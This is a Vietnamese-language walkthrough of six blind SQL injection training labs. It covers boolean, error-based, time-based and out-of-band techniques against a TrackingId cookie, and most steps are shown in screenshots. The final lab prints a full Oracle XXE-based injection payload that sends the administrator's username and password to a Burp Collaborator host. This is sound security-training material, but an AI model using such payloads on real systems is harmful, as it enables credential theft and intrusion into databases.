# [Lab: Blind SQL injection with conditional responses](#lab1)
# [Lab: Blind SQL injection with conditional errors](#lab2)
# [Lab: Blind SQL injection with time delays](#lab3)
# [Lab: Blind SQL injection with time delays and information retrieval](#lab4)
# [Lab: Blind SQL injection with out-of-band interaction](#lab5)
# [Lab: Blind SQL injection with out-of-band data exfiltration](#lab6)
# Lab: Blind SQL injection with conditional responses <a name="lab1">
  Lab này cung cấp cho một số thông tin:
  - Table: users có column username và password
  - Lab có sử dụng truy vấn SQL quản lý các giá trị cookie
  - Yêu cầu chúng ta phải tìm password của user administrator và dùng tài khoản đó login
  - Nếu kết quả câu truy vấn SQL không trả về thì chúng ta không dòng Welcome back! còn nếu kết quả câu truy vấn được trả về sẽ có dòng Welcome back!<br>
  Ở đây có 2 cookie:
  ![image](https://user-images.githubusercontent.com/20487674/122682164-09cbbc00-d222-11eb-83de-6adac2b49d96.png)
  Thực hiện fuzzing 2 cookie đó sau khi test cookie thứ nhất thì không thấy dấu hiệu gì khi f5 lại thì giá trị bị thay đổi tiếp đến cookie thứ hai<br>
  Thử với điều kiện đúng
  ![image](https://user-images.githubusercontent.com/20487674/122682336-f66d2080-d222-11eb-8904-e2d3df243c06.png)<br>
  Thử với điều kiện sai thì mất chữ Welcome back!
  ![image](https://user-images.githubusercontent.com/20487674/122682377-25839200-d223-11eb-9ad9-5bf35c650a65.png)<br>
  Với các thông tin mà lab cung cấp mình có viết script python để dump password:
  ![image](https://user-images.githubusercontent.com/20487674/122682901-400b3a80-d226-11eb-857b-715b060cc7dc.png)
# Lab: Blind SQL injection with conditional errors <a name="lab2">
  Thì lab này cũng cung cấp một thông tin như ở lab trước ,nhưng ở lab thì sẽ không có dấu hiệu  Welcome back! như lab trước nữa.Lab này endpoint thì vẫn giữ nguyên là TrackingId và lab này kêu mình tạo các điều kiện khiến dbms phải show ra thông báo lỗi<br>
  Bắt đầu thử fuzzing boolean lại thử xem , dù điều kiện boolean sai hay đúng gì vẫn như bình thường 
  ![image](https://user-images.githubusercontent.com/20487674/123667017-ef1dc680-d863-11eb-999c-bf7a4678663c.png)![image](https://user-images.githubusercontent.com/20487674/123667226-268c7300-d864-11eb-801c-69e757545152.png)<br>
  Tiếp theo sử dụng các function để xác định dbms<br>
  MYSQL và SQL Server dùng char(number ascii) chuyển từ ascii sang ký tự <br>
  ![image](https://user-images.githubusercontent.com/20487674/123670345-52f5be80-d867-11eb-9df7-6ad809043c94.png)
  
  PostgreSQL và Oracle dùng chr(number ascii) chuyển từ ascii sang ký tự <br>
  Test thử Postgresql<br>
  ![image](https://user-images.githubusercontent.com/20487674/123670648-a0722b80-d867-11eb-814d-9ee24832b13a.png)

  Riêng Oracle nhớ luôn có table dual và từ đây xác định web này dbms Oracle
  ![image](https://user-images.githubusercontent.com/20487674/123670887-e29b6d00-d867-11eb-8a00-d2d4e1efcbd6.png)<br>
  Điều kiện lỗi , do hàm chr(number) bắt đầu từ số từ 0 -> 255.Bây giờ sẽ ép cho dbms show lỗi chr(-1)
  ![image](https://user-images.githubusercontent.com/20487674/123671471-838a2800-d868-11eb-9edf-8b23fe2af4a5.png)<br>
  
  Tới đây mình sẽ build một payload sử dụng Searched CASE trong Oracle<br>
  ![image](https://user-images.githubusercontent.com/20487674/123676265-e7fbb600-d86d-11eb-8456-38510a9539cd.png)<br>
  Giải thích chút về payload
  ![image](https://user-images.githubusercontent.com/20487674/123676847-a28bb880-d86e-11eb-9ce6-824b5d6a8d5d.png)<br>
  Tới thì build script python chạy cho lẹ <br>
  ![image](https://user-images.githubusercontent.com/20487674/123678897-17f88880-d871-11eb-862e-3602fec0c89d.png)<br>
  Login và hoàn thành lab <br>
  ![image](https://user-images.githubusercontent.com/20487674/123679145-5ee67e00-d871-11eb-8d62-ad796eedbcf3.png)
  ![image](https://user-images.githubusercontent.com/20487674/123679232-79b8f280-d871-11eb-93e8-06e8a3ff90bf.png)
 # Lab: Blind SQL injection with time delays <a name="lab3">
  Đối với lab hướng dẫn chúng ta thêm 1 cách xác định ứng dụng web có lỗ hổng SQLI bằng phương pháp dựa vào thời gian phản hồi của website khi mình gửi request đến.<br>
  Endpoint như các lab trước là cookie TrackingId.Bước đầu thì test kiểu boolean và ép dbms show error xem có thay đổi gì hay không 
  ![image](https://user-images.githubusercontent.com/20487674/123961792-ef8c9d80-d9da-11eb-9666-1ca78281b6f2.png)<br>
  Thử inject boolean vào xem sao
  ![image](https://user-images.githubusercontent.com/20487674/123962021-2f538500-d9db-11eb-8bba-b2ef7c9fe156.png)<br>
  ![image](https://user-images.githubusercontent.com/20487674/123962093-472b0900-d9db-11eb-839c-77bb1aab0457.png)<br>
  Tiếp sẽ test condition error
  ![image](https://user-images.githubusercontent.com/20487674/123962652-e2bc7980-d9db-11eb-92ef-265151e17de7.png)<br>
  Sau thi tất cả các kiểu boolean với condition error thì không có kết quả gì hết,tiếp theo sẽ thử một số hàm sẽ làm thay đổi thời gian phản hồi<br>
  Đây một số hàm sẽ làm thay đổi thời gian phản hồi do burp cung cấp
  ![image](https://user-images.githubusercontent.com/20487674/123963113-55c5f000-d9dc-11eb-89e6-d172bea721e2.png)<br>
  Thời gian phản hồi khi trước khi inject payload vào<br>
  ![image](https://user-images.githubusercontent.com/20487674/123963371-958cd780-d9dc-11eb-9166-0e382fef75ec.png)<br>
  Sau khi inject một số payload thì chỉ có payload của postgresql hoạt động<br>
  ![image](https://user-images.githubusercontent.com/20487674/123981446-8150d680-d9ec-11eb-9b46-50f73308a6c3.png)
  # Lab: Blind SQL injection with time delays and information retrieval <a name="lab4">
  Bài lab này nối tiếp bài trước sau khi xác định lỗi sqli  thì bài lab kêu chúng ta phải truy xuất được dữ liệu<br>
  Lab này có cung cấp cho table: users ,column: username,password và có username là administrator <br>
  Trước hết kiểm tra user administrator  có password không đã (hơi thừa mà thui cũng nên check thử)<br>
  ![image](https://user-images.githubusercontent.com/20487674/124166401-fc89b980-dacc-11eb-8a56-da989c7a5ecf.png)<br>
  Như vậy xác định có password của administrator ,tiếp xác định độ dài chuỗi password dùng intruder bruteforce cho lẹ(dạng blind time này chưa biết POC như thế nào cho chính xác :v ).Attack type chọn loại sniper
  ![image](https://user-images.githubusercontent.com/20487674/124167056-c436ab00-dacd-11eb-8e2b-9ea11ce4616e.png)<br>
  Chọn list number cứ cho đại 1->100 <br>
  ![image](https://user-images.githubusercontent.com/20487674/124167247-05c75600-dace-11eb-99b3-ad6945a9d924.png)<br>
  Xác định được độ dài chuỗi là 20 bởi khi thời gian phản có thể bằng hoặc lớn hơn thời gian pg_sleep(3.5) thì đúng<br>
  ![image](https://user-images.githubusercontent.com/20487674/124168625-9a7e8380-dacf-11eb-8524-e61fce77e007.png)
  Tiếp theo xác định từng ký tự trong chuỗi<br>
  ![image](https://user-images.githubusercontent.com/20487674/124171941-673df380-dad3-11eb-89ca-166d79b579f5.png)<br>
  ![image](https://user-images.githubusercontent.com/20487674/124172186-b6842400-dad3-11eb-8931-81c4c70369ff.png)
  # Lab: Blind SQL injection with out-of-band interaction <a name="lab5">
  * Bắt đầu với lab sẽ chỉ cho chúng ta 1 phương pháp để phát hiện lỗi hổng sqli thông qua việc server dính vuln sẽ gửi request ra server bên thứ 3 
  * Ok thì bài này endpoint là ở chỗ cookie 
  * Thử inject boolean xem có thay đổi gì không với payload là dấu nháy '
  * ![image](https://user-images.githubusercontent.com/20487674/127745578-fe197af4-9e06-410a-a90f-6a469d44c5eb.png)
  * ![image](https://user-images.githubusercontent.com/20487674/127745596-83f9ce8d-2cee-43d5-9cfa-5bf71a9dabe7.png)
  * Kết quả không thay đổi gì tiếp tục boolean với payload dấu nháy "
  * ![image](https://user-images.githubusercontent.com/20487674/127745652-5f2b5aa3-86ad-4076-b2ae-ff0ceb5492b5.png)
  * ![image](https://user-images.githubusercontent.com/20487674/127745678-9cdc9b12-3e7f-4952-8b75-6ce11aa29bfa.png)
  * Cũng vậy tiếp theo thử union để bruteforce số cột và sử dụng EXTRACTVALUE và xmltype kết hợp kỹ thuật tấn công xxe để check xem có dính sqli hay không
  * Payload 1: 
  * ![image](https://user-images.githubusercontent.com/20487674/127746680-2c938468-f026-4185-9268-1a48fe8f6276.png)
  * ![image](https://user-images.githubusercontent.com/20487674/127746701-934ef2ae-e269-454f-ab91-523e8bc4f01d.png)
  * Payload 2:
  *![image](https://user-images.githubusercontent.com/20487674/127747587-6b9fff36-49ed-4c7b-9de5-b80b05c83dfe.png)
  * ![image](https://user-images.githubusercontent.com/20487674/127747602-df212525-708f-430c-9936-9f4465dc0577.png)
  # Lab: Blind SQL injection with out-of-band data exfiltration <a name="lab6">
  * Lab cuối này sẽ tiếp tục lab trước chỉ khác lab này ta khiến server gửi ouput câu query đến server của burp
  * Thông tin lab có cung cấp cho chúng ta table: users column: username,password
  * Chúng ta phải truy xuất được tài khoản administrator để login và hoàn thành lab
  * Đoạn payload mình sử dụng 
  > ' UNION SELECT EXTRACTVALUE(xmltype('\<?xml version="1.0" encoding="UTF-8"?>\<!DOCTYPE root [ \<!ENTITY % remote SYSTEM "http://5agec044po8m4mdcg5s0jlto6fc50u.burpcollaborator.net/information='||(SELECT 'username:'||username||'~password:'||password FROM users WHERE username='administrator')||'"> %remote;]>'),'/l') FROM dual--
  * ![image](https://user-images.githubusercontent.com/20487674/127748801-9f41b91d-8e81-469d-8a10-f93501310f48.png)
  * Login thôi nào
  * ![image](https://user-images.githubusercontent.com/20487674/127748835-8ef49e2a-239c-4769-bef4-68b58741cbe4.png)





  
  


  
  


  
  


  
  
  



  
  


  
  
  
  


  
  
  




  

  
